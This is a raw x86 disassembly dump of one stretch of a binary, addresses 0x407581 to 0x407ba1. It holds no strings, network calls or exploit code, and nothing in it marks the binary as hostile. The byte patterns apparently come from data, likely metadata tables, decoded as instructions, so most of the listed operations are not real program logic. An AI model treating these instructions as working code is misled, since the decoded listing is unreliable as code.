  407581:	00 50 60             	add    %dl,0x60(%eax)
  407584:	00 00                	add    %al,(%eax)
  407586:	00 00                	add    %al,(%eax)
  407588:	16                   	push   %ss
  407589:	00 c3                	add    %al,%bl
  40758b:	05 1e 01 28 00       	add    $0x28011e,%eax
  407590:	d4 60                	aam    $0x60
  407592:	00 00                	add    %al,(%eax)
  407594:	00 00                	add    %al,(%eax)
  407596:	16                   	push   %ss
  407597:	00 cc                	add    %cl,%ah
  407599:	05 23 01 29 00       	add    $0x290123,%eax
  40759e:	b8 61 00 00 00       	mov    $0x61,%eax
  4075a3:	00 11                	add    %dl,(%ecx)
  4075a5:	00 d6                	add    %dl,%dh
  4075a7:	05 27 01 29 00       	add    $0x290127,%eax
  4075ac:	5c                   	pop    %esp
  4075ad:	62 00                	bound  %eax,(%eax)
  4075af:	00 00                	add    %al,(%eax)
  4075b1:	00 11                	add    %dl,(%ecx)
  4075b3:	08 e4                	or     %ah,%ah
  4075b5:	0d 17 00 2b 00       	or     $0x2b0017,%eax
  4075ba:	68 62 00 00 00       	push   $0x62
  4075bf:	00 11                	add    %dl,(%ecx)
  4075c1:	08 f0                	or     %dh,%al
  4075c3:	0d 1a 01 2b 00       	or     $0x2b011a,%eax
  4075c8:	ac                   	lods   %ds:(%esi),%al
  4075c9:	62 00                	bound  %eax,(%eax)
  4075cb:	00 00                	add    %al,(%eax)
  4075cd:	00 11                	add    %dl,(%ecx)
  4075cf:	18 44 01 17          	sbb    %al,0x17(%ecx,%eax,1)
  4075d3:	00 2b                	add    %ch,(%ebx)
  4075d5:	00 e0                	add    %ah,%al
  4075d7:	62 00                	bound  %eax,(%eax)
  4075d9:	00 00                	add    %al,(%eax)
  4075db:	00 16                	add    %dl,(%esi)
  4075dd:	00 f3                	add    %dh,%bl
  4075df:	05 32 01 2b 00       	add    $0x2b0132,%eax
  4075e4:	fc                   	cld
  4075e5:	62 00                	bound  %eax,(%eax)
  4075e7:	00 00                	add    %al,(%eax)
  4075e9:	00 16                	add    %dl,(%esi)
  4075eb:	00 f8                	add    %bh,%al
  4075ed:	05 38 01 2c 00       	add    $0x2c0138,%eax
  4075f2:	18 63 00             	sbb    %ah,0x0(%ebx)
  4075f5:	00 00                	add    %al,(%eax)
  4075f7:	00 16                	add    %dl,(%esi)
  4075f9:	00 fb                	add    %bh,%bl
  4075fb:	05 23 01 2d 00       	add    $0x2d0123,%eax
  407600:	a8 63                	test   $0x63,%al
  407602:	00 00                	add    %al,(%eax)
  407604:	00 00                	add    %al,(%eax)
  407606:	16                   	push   %ss
  407607:	00 fe                	add    %bh,%dh
  407609:	05 3e 01 2d 00       	add    $0x2d013e,%eax
  40760e:	1c 64                	sbb    $0x64,%al
  407610:	00 00                	add    %al,(%eax)
  407612:	00 00                	add    %al,(%eax)
  407614:	16                   	push   %ss
  407615:	00 11                	add    %dl,(%ecx)
  407617:	06                   	push   %es
  407618:	43                   	inc    %ebx
  407619:	01 2e                	add    %ebp,(%esi)
  40761b:	00 54 64 00          	add    %dl,0x0(%esp,%eiz,2)
  40761f:	00 00                	add    %al,(%eax)
  407621:	00 16                	add    %dl,(%esi)
  407623:	00 21                	add    %ah,(%ecx)
  407625:	06                   	push   %es
  407626:	43                   	inc    %ebx
  407627:	01 2f                	add    %ebp,(%edi)
  407629:	00 84 64 00 00 00 00 	add    %al,0x0(%esp,%eiz,2)
  407630:	16                   	push   %ss
  407631:	00 2a                	add    %ch,(%edx)
  407633:	06                   	push   %es
  407634:	48                   	dec    %eax
  407635:	01 30                	add    %esi,(%eax)
  407637:	00 04 65 00 00 00 00 	add    %al,0x0(,%eiz,2)
  40763e:	16                   	push   %ss
  40763f:	00 33                	add    %dh,(%ebx)
  407641:	06                   	push   %es
  407642:	4f                   	dec    %edi
  407643:	01 32                	add    %esi,(%edx)
  407645:	00 78 65             	add    %bh,0x65(%eax)
  407648:	00 00                	add    %al,(%eax)
  40764a:	00 00                	add    %al,(%eax)
  40764c:	16                   	push   %ss
  40764d:	00 47 06             	add    %al,0x6(%edi)
  407650:	4f                   	dec    %edi
  407651:	01 33                	add    %esi,(%ebx)
  407653:	00 ec                	add    %ch,%ah
  407655:	65 00 00             	add    %al,%gs:(%eax)
  407658:	00 00                	add    %al,(%eax)
  40765a:	16                   	push   %ss
  40765b:	00 55 06             	add    %dl,0x6(%ebp)
  40765e:	23 01                	and    (%ecx),%eax
  407660:	34 00                	xor    $0x0,%al
  407662:	48                   	dec    %eax
  407663:	66 00 00             	data16 add %al,(%eax)
  407666:	00 00                	add    %al,(%eax)
  407668:	16                   	push   %ss
  407669:	00 5c 06 23          	add    %bl,0x23(%esi,%eax,1)
  40766d:	01 34 00             	add    %esi,(%eax,%eax,1)
  407670:	b0 66                	mov    $0x66,%al
  407672:	00 00                	add    %al,(%eax)
  407674:	00 00                	add    %al,(%eax)
  407676:	16                   	push   %ss
  407677:	00 61 06             	add    %ah,0x6(%ecx)
  40767a:	23 01                	and    (%ecx),%eax
  40767c:	34 00                	xor    $0x0,%al
  40767e:	0c 67                	or     $0x67,%al
  407680:	00 00                	add    %al,(%eax)
  407682:	00 00                	add    %al,(%eax)
  407684:	16                   	push   %ss
  407685:	00 67 06             	add    %ah,0x6(%edi)
  407688:	23 01                	and    (%ecx),%eax
  40768a:	34 00                	xor    $0x0,%al
  40768c:	80 67 00 00          	andb   $0x0,0x0(%edi)
  407690:	00 00                	add    %al,(%eax)
  407692:	16                   	push   %ss
  407693:	00 6f 06             	add    %ch,0x6(%edi)
  407696:	23 01                	and    (%ecx),%eax
  407698:	34 00                	xor    $0x0,%al
  40769a:	84 68 00             	test   %ch,0x0(%eax)
  40769d:	00 00                	add    %al,(%eax)
  40769f:	00 16                	add    %dl,(%esi)
  4076a1:	00 79 06             	add    %bh,0x6(%ecx)
  4076a4:	1a 01                	sbb    (%ecx),%al
  4076a6:	34 00                	xor    $0x0,%al
  4076a8:	a8 68                	test   $0x68,%al
  4076aa:	00 00                	add    %al,(%eax)
  4076ac:	00 00                	add    %al,(%eax)
  4076ae:	16                   	push   %ss
  4076af:	00 85 06 17 00 34    	add    %al,0x34001706(%ebp)
  4076b5:	00 c4                	add    %al,%ah
  4076b7:	68 00 00 00 00       	push   $0x0
  4076bc:	16                   	push   %ss
  4076bd:	00 b0 06 bd 00 34    	add    %dh,0x3400bd06(%eax)
  4076c3:	00 f8                	add    %bh,%al
  4076c5:	68 00 00 00 00       	push   $0x0
  4076ca:	16                   	push   %ss
  4076cb:	00 b6 06 3e 01 34    	add    %dh,0x34013e06(%esi)
  4076d1:	00 40 69             	add    %al,0x69(%eax)
  4076d4:	00 00                	add    %al,(%eax)
  4076d6:	00 00                	add    %al,(%eax)
  4076d8:	11 08                	adc    %ecx,(%eax)
  4076da:	3a 15 17 00 35 00    	cmp    0x350017,%dl
  4076e0:	fc                   	cld
  4076e1:	69 00 00 00 00 06    	imul   $0x6000000,(%eax),%eax
  4076e7:	18 09                	sbb    %cl,(%ecx)
  4076e9:	01 13                	add    %edx,(%ebx)
  4076eb:	00 35 00 00 00 00    	add    %dh,0x0
  4076f1:	00 80 00 11 20 c6    	add    %al,-0x39dfef00(%eax)
  4076f7:	06                   	push   %es
  4076f8:	5a                   	pop    %edx
  4076f9:	01 35 00 04 6a 00    	add    %esi,0x6a0400
  4076ff:	00 00                	add    %al,(%eax)
  407701:	00 16                	add    %dl,(%esi)
  407703:	00 16                	add    %dl,(%esi)
  407705:	07                   	pop    %es
  407706:	67 01 3e 00 7c       	add    %edi,0x7c00
  40770b:	6c                   	insb   (%dx),%es:(%edi)
  40770c:	00 00                	add    %al,(%eax)
  40770e:	00 00                	add    %al,(%eax)
  407710:	16                   	push   %ss
  407711:	00 4b 07             	add    %cl,0x7(%ebx)
  407714:	6e                   	outsb  %ds:(%esi),(%dx)
  407715:	01 40 00             	add    %eax,0x0(%eax)
  407718:	00 00                	add    %al,(%eax)
  40771a:	00 00                	add    %al,(%eax)
  40771c:	03 00                	add    (%eax),%eax
  40771e:	06                   	push   %es
  40771f:	18 09                	sbb    %cl,(%ecx)
  407721:	01 74 01 41          	add    %esi,0x41(%ecx,%eax,1)
  407725:	00 00                	add    %al,(%eax)
  407727:	00 00                	add    %al,(%eax)
  407729:	00 03                	add    %al,(%ebx)
  40772b:	00 46 03             	add    %al,0x3(%esi)
  40772e:	96                   	xchg   %eax,%esi
  40772f:	07                   	pop    %es
  407730:	7a 01                	jp     0x407733
  407732:	43                   	inc    %ebx
  407733:	00 00                	add    %al,(%eax)
  407735:	00 00                	add    %al,(%eax)
  407737:	00 03                	add    %al,(%ebx)
  407739:	00 46 03             	add    %al,0x3(%esi)
  40773c:	c6 07 83             	movb   $0x83,(%edi)
  40773f:	01 46 00             	add    %eax,0x0(%esi)
  407742:	00 00                	add    %al,(%eax)
  407744:	00 00                	add    %al,(%eax)
  407746:	03 00                	add    (%eax),%eax
  407748:	46                   	inc    %esi
  407749:	03 e4                	add    %esp,%esp
  40774b:	07                   	pop    %es
  40774c:	89 01                	mov    %eax,(%ecx)
  40774e:	47                   	inc    %edi
  40774f:	00 00                	add    %al,(%eax)
  407751:	00 00                	add    %al,(%eax)
  407753:	00 03                	add    %al,(%ebx)
  407755:	00 06                	add    %al,(%esi)
  407757:	18 09                	sbb    %cl,(%ecx)
  407759:	01 74 01 48          	add    %esi,0x48(%ecx,%eax,1)
  40775d:	00 00                	add    %al,(%eax)
  40775f:	00 00                	add    %al,(%eax)
  407761:	00 03                	add    %al,(%ebx)
  407763:	00 46 03             	add    %al,0x3(%esi)
  407766:	96                   	xchg   %eax,%esi
  407767:	07                   	pop    %es
  407768:	f0 02 4a 00          	lock add 0x0(%edx),%cl
  40776c:	00 00                	add    %al,(%eax)
  40776e:	00 00                	add    %al,(%eax)
  407770:	03 00                	add    (%eax),%eax
  407772:	46                   	inc    %esi
  407773:	03 c6                	add    %esi,%eax
  407775:	07                   	pop    %es
  407776:	83 01 4c             	addl   $0x4c,(%ecx)
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 00                	add    %al,(%eax)
  40777d:	00 03                	add    %al,(%ebx)
  40777f:	00 46 03             	add    %al,0x3(%esi)
  407782:	e4 07                	in     $0x7,%al
  407784:	13 00                	adc    (%eax),%eax
  407786:	4d                   	dec    %ebp
  407787:	00 a4 62 00 00 00 00 	add    %ah,0x0(%edx,%eiz,2)
  40778e:	06                   	push   %es
  40778f:	18 09                	sbb    %cl,(%ecx)
  407791:	01 13                	add    %edx,(%ebx)
  407793:	00 4d 00             	add    %cl,0x0(%ebp)
  407796:	7c 62                	jl     0x4077fa
  407798:	00 00                	add    %al,(%eax)
  40779a:	00 00                	add    %al,(%eax)
  40779c:	06                   	push   %es
  40779d:	08 d8                	or     %bl,%al
  40779f:	0d 13 00 4d 00       	or     $0x4d0013,%eax
  4077a4:	00 00                	add    %al,(%eax)
  4077a6:	01 00                	add    %eax,(%eax)
  4077a8:	05 02 00 00 01       	add    $0x1000002,%eax
  4077ad:	00 3e                	add    %bh,(%esi)
  4077af:	02 00                	add    (%eax),%al
  4077b1:	00 01                	add    %al,(%ecx)
  4077b3:	00 3e                	add    %bh,(%esi)
  4077b5:	02 00                	add    (%eax),%al
  4077b7:	00 01                	add    %al,(%ecx)
  4077b9:	00 9c 03 00 00 01 00 	add    %bl,0x10000(%ebx,%eax,1)
  4077c0:	a9 03 00 00 01       	test   $0x1000003,%eax
  4077c5:	00 b0 03 00 00 01    	add    %dh,0x1000003(%eax)
  4077cb:	00 9c 03 00 00 01 00 	add    %bl,0x10000(%ebx,%eax,1)
  4077d2:	90                   	nop
  4077d3:	0b 00                	or     (%eax),%eax
  4077d5:	00 01                	add    %al,(%ecx)
  4077d7:	00 90 0b 00 00 01    	add    %dl,0x100000b(%eax)
  4077dd:	00 12                	add    %dl,(%edx)
  4077df:	04 00                	add    $0x0,%al
  4077e1:	00 01                	add    %al,(%ecx)
  4077e3:	00 3d 04 00 00 01    	add    %bh,0x1000004
  4077e9:	00 74 04 00          	add    %dh,0x0(%esp,%eax,1)
  4077ed:	00 02                	add    %al,(%edx)
  4077ef:	00 7b 04             	add    %bh,0x4(%ebx)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	01 00                	add    %eax,(%eax)
  4077f6:	74 04                	je     0x4077fc
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	02 00                	add    (%eax),%al
  4077fc:	7b 04                	jnp    0x407802
  4077fe:	00 00                	add    %al,(%eax)
  407800:	01 00                	add    %eax,(%eax)
  407802:	a9 03 00 00 01       	test   $0x1000003,%eax
  407807:	00 bc 04 00 00 02 00 	add    %bh,0x20000(%esp,%eax,1)
  40780e:	c4 04 00             	les    (%eax,%eax,1),%eax
  407811:	00 03                	add    %al,(%ebx)
  407813:	00 c7                	add    %al,%bh
  407815:	04 00                	add    $0x0,%al
  407817:	00 04 00             	add    %al,(%eax,%eax,1)
  40781a:	ca 04 00             	lret   $0x4
  40781d:	00 05 00 d3 04 00    	add    %al,0x4d300
  407823:	00 01                	add    %al,(%ecx)
  407825:	00 f2                	add    %dh,%dl
  407827:	04 00                	add    $0x0,%al
  407829:	00 02                	add    %al,(%edx)
  40782b:	00 f6                	add    %dh,%dh
  40782d:	04 00                	add    $0x0,%al
  40782f:	00 03                	add    %al,(%ebx)
  407831:	00 bc 04 00 00 04 00 	add    %bh,0x40000(%esp,%eax,1)
  407838:	d3 04 00             	roll   %cl,(%eax,%eax,1)
  40783b:	00 01                	add    %al,(%ecx)
  40783d:	00 27                	add    %ah,(%edi)
  40783f:	05 00 00 02 00       	add    $0x20000,%eax
  407844:	36 05 00 00 03 00    	ss add $0x30000,%eax
  40784a:	3e 05 00 00 04 00    	ds add $0x40000,%eax
  407850:	40                   	inc    %eax
  407851:	05 00 00 05 00       	add    $0x50000,%eax
  407856:	42                   	inc    %edx
  407857:	05 00 00 06 00       	add    $0x60000,%eax
  40785c:	49                   	dec    %ecx
  40785d:	05 00 00 07 00       	add    $0x70000,%eax
  407862:	51                   	push   %ecx
  407863:	05 00 00 08 00       	add    $0x80000,%eax
  407868:	5c                   	pop    %esp
  407869:	05 00 00 01 00       	add    $0x10000,%eax
  40786e:	80 05 00 20 02 00 88 	addb   $0x88,0x22000
  407875:	05 00 00 03 00       	add    $0x30000,%eax
  40787a:	91                   	xchg   %eax,%ecx
  40787b:	05 00 20 04 00       	add    $0x42000,%eax
  407880:	98                   	cwtl
  407881:	05 00 00 05 00       	add    $0x50000,%eax
  407886:	a0 05 00 00 01       	mov    0x1000005,%al
  40788b:	00 ba 05 00 00 01    	add    %bh,0x1000005(%edx)
  407891:	00 ba 05 00 00 01    	add    %bh,0x1000005(%edx)
  407897:	00 df                	add    %bl,%bh
  407899:	05 00 00 02 00       	add    $0x20000,%eax
  40789e:	e4 05                	in     $0x5,%al
  4078a0:	00 00                	add    %al,(%eax)
  4078a2:	01 00                	add    %eax,(%eax)
  4078a4:	f6 05 00 00 01 00 a9 	testb  $0xa9,0x10000
  4078ab:	03 00                	add    (%eax),%eax
  4078ad:	00 01                	add    %al,(%ecx)
  4078af:	00 07                	add    %al,(%edi)
  4078b1:	06                   	push   %es
  4078b2:	00 00                	add    %al,(%eax)
  4078b4:	01 00                	add    %eax,(%eax)
  4078b6:	1c 06                	sbb    $0x6,%al
  4078b8:	00 00                	add    %al,(%eax)
  4078ba:	01 00                	add    %eax,(%eax)
  4078bc:	26 06                	es push %es
  4078be:	00 00                	add    %al,(%eax)
  4078c0:	01 00                	add    %eax,(%eax)
  4078c2:	a9 03 00 00 02       	test   $0x2000003,%eax
  4078c7:	00 31                	add    %dh,(%ecx)
  4078c9:	06                   	push   %es
  4078ca:	00 00                	add    %al,(%eax)
  4078cc:	01 00                	add    %eax,(%eax)
  4078ce:	41                   	inc    %ecx
  4078cf:	06                   	push   %es
  4078d0:	00 00                	add    %al,(%eax)
  4078d2:	01 00                	add    %eax,(%eax)
  4078d4:	41                   	inc    %ecx
  4078d5:	06                   	push   %es
  4078d6:	00 00                	add    %al,(%eax)
  4078d8:	01 00                	add    %eax,(%eax)
  4078da:	be 06 00 00 01       	mov    $0x1000006,%esi
  4078df:	00 cd                	add    %cl,%ch
  4078e1:	06                   	push   %es
  4078e2:	00 00                	add    %al,(%eax)
  4078e4:	02 00                	add    (%eax),%al
  4078e6:	d1 06                	roll   $1,(%esi)
  4078e8:	00 00                	add    %al,(%eax)
  4078ea:	03 00                	add    (%eax),%eax
  4078ec:	d8 06                	fadds  (%esi)
  4078ee:	00 00                	add    %al,(%eax)
  4078f0:	04 00                	add    $0x0,%al
  4078f2:	42                   	inc    %edx
  4078f3:	05 00 00 05 00       	add    $0x50000,%eax
  4078f8:	49                   	dec    %ecx
  4078f9:	05 00 00 06 00       	add    $0x60000,%eax
  4078fe:	df 06                	filds  (%esi)
  407900:	00 00                	add    %al,(%eax)
  407902:	07                   	pop    %es
  407903:	00 e6                	add    %ah,%dh
  407905:	06                   	push   %es
  407906:	00 00                	add    %al,(%eax)
  407908:	08 00                	or     %al,(%eax)
  40790a:	ec                   	in     (%dx),%al
  40790b:	06                   	push   %es
  40790c:	00 00                	add    %al,(%eax)
  40790e:	09 00                	or     %eax,(%eax)
  407910:	f2 06                	repnz push %es
  407912:	00 00                	add    %al,(%eax)
  407914:	01 00                	add    %eax,(%eax)
  407916:	1e                   	push   %ds
  407917:	07                   	pop    %es
  407918:	00 00                	add    %al,(%eax)
  40791a:	02 00                	add    (%eax),%al
  40791c:	23 07                	and    (%edi),%eax
  40791e:	00 00                	add    %al,(%eax)
  407920:	01 00                	add    %eax,(%eax)
  407922:	5a                   	pop    %edx
  407923:	07                   	pop    %es
  407924:	00 00                	add    %al,(%eax)
  407926:	01 00                	add    %eax,(%eax)
  407928:	6e                   	outsb  %ds:(%esi),(%dx)
  407929:	07                   	pop    %es
  40792a:	00 00                	add    %al,(%eax)
  40792c:	02 00                	add    (%eax),%al
  40792e:	7b 07                	jnp    0x407937
  407930:	00 00                	add    %al,(%eax)
  407932:	01 00                	add    %eax,(%eax)
  407934:	3d 04 00 00 02       	cmp    $0x2000004,%eax
  407939:	00 a2 07 00 00 03    	add    %ah,0x3000007(%edx)
  40793f:	00 b3 07 00 00 01    	add    %dh,0x1000007(%ebx)
  407945:	00 d0                	add    %dl,%al
  407947:	07                   	pop    %es
  407948:	00 00                	add    %al,(%eax)
  40794a:	01 00                	add    %eax,(%eax)
  40794c:	3d 04 00 00 01       	cmp    $0x1000004,%eax
  407951:	00 6e 07             	add    %ch,0x7(%esi)
  407954:	00 00                	add    %al,(%eax)
  407956:	02 00                	add    (%eax),%al
  407958:	7b 07                	jnp    0x407961
  40795a:	00 00                	add    %al,(%eax)
  40795c:	01 00                	add    %eax,(%eax)
  40795e:	a2 07 00 00 02       	mov    %al,0x2000007
  407963:	00 b3 07 00 00 01    	add    %dh,0x1000007(%ebx)
  407969:	00 d0                	add    %dl,%al
  40796b:	07                   	pop    %es
  40796c:	09 00                	or     %eax,(%eax)
  40796e:	09 01                	or     %eax,(%ecx)
  407970:	13 00                	adc    (%eax),%eax
  407972:	99                   	cltd
  407973:	00 09                	add    %cl,(%ecx)
  407975:	01 8e 01 a9 00 09    	add    %ecx,0x900a901(%esi)
  40797b:	01 9d 01 11 00 09    	add    %ebx,0x9001101(%ebp)
  407981:	01 13                	add    %edx,(%ebx)
  407983:	00 b1 00 09 01 13    	add    %dh,0x13010900(%ecx)
  407989:	00 24 00             	add    %ah,(%eax,%eax,1)
  40798c:	09 01                	or     %eax,(%ecx)
  40798e:	13 00                	adc    (%eax),%eax
  407990:	2c 00                	sub    $0x0,%al
  407992:	09 01                	or     %eax,(%ecx)
  407994:	13 00                	adc    (%eax),%eax
  407996:	34 00                	xor    $0x0,%al
  407998:	09 01                	or     %eax,(%ecx)
  40799a:	13 00                	adc    (%eax),%eax
  40799c:	3c 00                	cmp    $0x0,%al
  40799e:	09 01                	or     %eax,(%ecx)
  4079a0:	13 00                	adc    (%eax),%eax
  4079a2:	24 00                	and    $0x0,%al
  4079a4:	5b                   	pop    %ebx
  4079a5:	02 8b 00 2c 00 5b    	add    0x5b002c00(%ebx),%cl
  4079ab:	02 8b 00 34 00 5b    	add    0x5b003400(%ebx),%cl
  4079b1:	02 8b 00 3c 00 5b    	add    0x5b003c00(%ebx),%cl
  4079b7:	02 8b 00 b9 00 09    	add    0x900b900(%ebx),%cl
  4079bd:	01 13                	add    %edx,(%ebx)
  4079bf:	00 c1                	add    %al,%cl
  4079c1:	00 09                	add    %cl,(%ecx)
  4079c3:	01 13                	add    %edx,(%ebx)
  4079c5:	00 c9                	add    %cl,%cl
  4079c7:	00 09                	add    %cl,(%ecx)
  4079c9:	01 89 01 d1 00 2e    	add    %ecx,0x2e00d101(%ecx)
  4079cf:	09 37                	or     %esi,(%edi)
  4079d1:	02 19                	add    (%ecx),%bl
  4079d3:	00 fe                	add    %bh,%dh
  4079d5:	01 63 00             	add    %esp,0x0(%ebx)
  4079d8:	19 00                	sbb    %eax,(%eax)
  4079da:	07                   	pop    %es
  4079db:	02 68 00             	add    0x0(%eax),%ch
  4079de:	29 00                	sub    %eax,(%eax)
  4079e0:	4f                   	dec    %edi
  4079e1:	09 44 02 19          	or     %eax,0x19(%edx,%eax,1)
  4079e5:	00 20                	add    %ah,(%eax)
  4079e7:	02 71 00             	add    0x0(%ecx),%dh
  4079ea:	e1 00                	loope  0x4079ec
  4079ec:	6b 09 54             	imul   $0x54,(%ecx),%ecx
  4079ef:	02 19                	add    (%ecx),%bl
  4079f1:	00 09                	add    %cl,(%ecx)
  4079f3:	01 13                	add    %edx,(%ebx)
  4079f5:	00 e9                	add    %ch,%cl
  4079f7:	00 09                	add    %cl,(%ecx)
  4079f9:	01 64 02 44          	add    %esp,0x44(%edx,%eax,1)
  4079fd:	00 6b 02             	add    %ch,0x2(%ebx)
  407a00:	90                   	nop
  407a01:	00 f1                	add    %dh,%cl
  407a03:	00 09                	add    %cl,(%ecx)
  407a05:	01 df                	add    %ebx,%edi
  407a07:	02 f9                	add    %cl,%bh
  407a09:	00 09                	add    %cl,(%ecx)
  407a0b:	01 13                	add    %edx,(%ebx)
  407a0d:	00 01                	add    %al,(%ecx)
  407a0f:	01 09                	add    %ecx,(%ecx)
  407a11:	01 13                	add    %edx,(%ebx)
  407a13:	00 61 00             	add    %ah,0x0(%ecx)
  407a16:	f9                   	stc
  407a17:	09 d6                	or     %edx,%esi
  407a19:	00 61 00             	add    %ah,0x0(%ecx)
  407a1c:	19 0a                	sbb    %ecx,(%edx)
  407a1e:	ea 02 09 01 28 0a 71 	ljmp   $0x710a,$0x28010902
  407a25:	00 11                	add    %dl,(%ecx)
  407a27:	01 09                	add    %ecx,(%ecx)
  407a29:	01 89 01 71 00 84    	add    %ecx,-0x7bff8eff(%ecx)
  407a2f:	0a 2a                	or     (%edx),%ch
  407a31:	03 29                	add    (%ecx),%ebp
  407a33:	01 96 0a 2a 03 29    	add    %edx,0x29032a0a(%esi)
  407a39:	01 a9 0a 2f 03 39    	add    %ebp,0x39032f0a(%ecx)
  407a3f:	01 bc 0a 3e 01 41 01 	add    %edi,0x141013e(%edx,%ecx,1)
  407a46:	cf                   	iret
  407a47:	0a 36                	or     (%esi),%dh
  407a49:	03 49 01             	add    0x1(%ecx),%ecx
  407a4c:	db 0a                	fisttpl (%edx)
  407a4e:	27                   	daa
  407a4f:	01 19                	add    %ebx,(%ecx)
  407a51:	01 09                	add    %ecx,(%ecx)
  407a53:	01 89 01 51 01 fe    	add    %ecx,-0x1feaeff(%ecx)
  407a59:	0a 3d 03 61 01 19    	or     0x19016103,%bh
  407a5f:	0b 44 03 61          	or     0x61(%ebx,%eax,1),%eax
  407a63:	01 29                	add    %ebp,(%ecx)
  407a65:	0b 17                	or     (%edi),%edx
  407a67:	00 69 01             	add    %ch,0x1(%ecx)
  407a6a:	09 01                	or     %eax,(%ecx)
  407a6c:	74 01                	je     0x407a6f
  407a6e:	71 00                	jno    0x407a70
  407a70:	09 01                	or     %eax,(%ecx)
  407a72:	4b                   	dec    %ebx
  407a73:	03 71 00             	add    0x0(%ecx),%esi
  407a76:	47                   	inc    %edi
  407a77:	0b 13                	or     (%ebx),%edx
  407a79:	00 71 00             	add    %dh,0x0(%ecx)
  407a7c:	4d                   	dec    %ebp
  407a7d:	0b 13                	or     (%ebx),%edx
  407a7f:	00 71 01             	add    %dh,0x1(%ecx)
  407a82:	09 01                	or     %eax,(%ecx)
  407a84:	13 00                	adc    (%eax),%eax
  407a86:	71 01                	jno    0x407a89
  407a88:	59                   	pop    %ecx
  407a89:	0b 5e 03             	or     0x3(%esi),%ebx
  407a8c:	79 01                	jns    0x407a8f
  407a8e:	69 0b 64 03 81 01    	imul   $0x1810364,(%ebx),%ecx
  407a94:	09 01                	or     %eax,(%ecx)
  407a96:	13 00                	adc    (%eax),%eax
  407a98:	89 01                	mov    %eax,(%ecx)
  407a9a:	09 01                	or     %eax,(%ecx)
  407a9c:	13 00                	adc    (%eax),%eax
  407a9e:	51                   	push   %ecx
  407a9f:	00 09                	add    %cl,(%ecx)
  407aa1:	01 df                	add    %ebx,%edi
  407aa3:	02 39                	add    (%ecx),%bh
  407aa5:	00 09                	add    %cl,(%ecx)
  407aa7:	01 6d 03             	add    %ebp,0x3(%ebp)
  407aaa:	41                   	inc    %ecx
  407aab:	00 09                	add    %cl,(%ecx)
  407aad:	01 13                	add    %edx,(%ebx)
  407aaf:	00 39                	add    %bh,(%ecx)
  407ab1:	00 f5                	add    %dh,%ch
  407ab3:	0b 7a 03             	or     0x3(%edx),%edi
  407ab6:	39 00                	cmp    %eax,(%eax)
  407ab8:	0b 0c 7a             	or     (%edx,%edi,2),%ecx
  407abb:	03 b9 01 2a 0c 7f    	add    0x7f0c2a01(%ecx),%edi
  407ac1:	03 39                	add    (%ecx),%edi
  407ac3:	00 34 0c             	add    %dh,(%esp,%ecx,1)
  407ac6:	84 03                	test   %al,(%ebx)
  407ac8:	b9 01 20 02 1e       	mov    $0x1e022001,%ecx
  407acd:	01 91 00 09 01 74    	add    %edx,0x74010900(%ecx)
  407ad3:	01 39                	add    %edi,(%ecx)
  407ad5:	00 8f 03 8a 03 91    	add    %cl,-0x6efc75fd(%edi)
  407adb:	01 09                	add    %ecx,(%ecx)
  407add:	01 74 01 49          	add    %esi,0x49(%ecx,%eax,1)
  407ae1:	00 09                	add    %cl,(%ecx)
  407ae3:	01 99 03 c9 01 58    	add    %ebx,0x5801c903(%ecx)
  407ae9:	0c 64                	or     $0x64,%al
  407aeb:	03 d1                	add    %ecx,%edx
  407aed:	01 09                	add    %ecx,(%ecx)
  407aef:	01 13                	add    %edx,(%ebx)
  407af1:	00 29                	add    %ch,(%ecx)
  407af3:	01 69 0c             	add    %ebp,0xc(%ecx)
  407af6:	23 01                	and    (%ecx),%eax
  407af8:	d1 01                	roll   $1,(%ecx)
  407afa:	76 0c                	jbe    0x407b08
  407afc:	71 00                	jno    0x407afe
  407afe:	41                   	inc    %ecx
  407aff:	01 85 0c ac 03 29    	add    %eax,0x2903ac0c(%ebp)
  407b05:	01 9d 0c b2 03 d9    	add    %ebx,-0x26fc4df4(%ebp)
  407b0b:	01 ab 0c 71 00 41    	add    %ebp,0x4100710c(%ebx)
  407b11:	01 cf                	add    %ecx,%edi
  407b13:	0a b8 03 29 01 bb    	or     -0x44fed6fd(%eax),%bh
  407b19:	0c 1a                	or     $0x1a,%al
  407b1b:	01 e1                	add    %esp,%ecx
  407b1d:	01 20                	add    %esp,(%eax)
  407b1f:	02 71 00             	add    0x0(%ecx),%dh
  407b22:	41                   	inc    %ecx
  407b23:	01 cf                	add    %ecx,%edi
  407b25:	0a be 03 39 00 de    	or     -0x21ffc6fd(%esi),%bh
  407b2b:	0c ce                	or     $0xce,%al
  407b2d:	03 41 00             	add    0x0(%ecx),%eax
  407b30:	e9 0c d4 03 b9       	jmp    0xb9444f41
  407b35:	01 f1                	add    %esi,%ecx
  407b37:	0c d9                	or     $0xd9,%al
  407b39:	03 e9                	add    %ecx,%ebp
  407b3b:	01 ff                	add    %edi,%edi
  407b3d:	0c 13                	or     $0x13,%al
  407b3f:	00 41 00             	add    %al,0x0(%ecx)
  407b42:	07                   	pop    %es
  407b43:	0d de 03 41 00       	or     $0x4103de,%eax
  407b48:	11 0d e3 03 41 00    	adc    %ecx,0x4103e3
  407b4e:	17                   	pop    %ss
  407b4f:	0d eb 03 f1 01       	or     $0x1f103eb,%eax
  407b54:	09 01                	or     %eax,(%ecx)
  407b56:	74 01                	je     0x407b59
  407b58:	f9                   	stc
  407b59:	01 3a                	add    %edi,(%edx)
  407b5b:	0d ef 03 01 02       	or     $0x20103ef,%eax
  407b60:	5e                   	pop    %esi
  407b61:	0d 68 03 09 02       	or     $0x2090368,%eax
  407b66:	82 0d 04 04 b9 01 20 	orb    $0x20,0x1b90404
  407b6d:	02 0b                	add    (%ebx),%cl
  407b6f:	04 39                	add    $0x39,%al
  407b71:	00 93 0d 10 04 39    	add    %dl,0x3904100d(%ebx)
  407b77:	00 98 0d 8a 03 19    	add    %bl,0x19038a0d(%eax)
  407b7d:	02 ff                	add    %bh,%bh
  407b7f:	0c 13                	or     $0x13,%al
  407b81:	00 09                	add    %cl,(%ecx)
  407b83:	02 96 0a 68 03 39    	add    0x3903680a(%esi),%dl
  407b89:	00 b4 03 ce 03 49 00 	add    %dh,0x4903ce(%ebx,%eax,1)
  407b90:	ff 0c 13             	decl   (%ebx,%edx,1)
  407b93:	00 e9                	add    %ch,%cl
  407b95:	01 ae 0d 13 00 39    	add    %ebp,0x3900130d(%esi)
  407b9b:	00 ae 0d 13 00 39    	add    %ch,0x3900130d(%esi)
  407ba1:	00 ff                	add    %bh,%bh
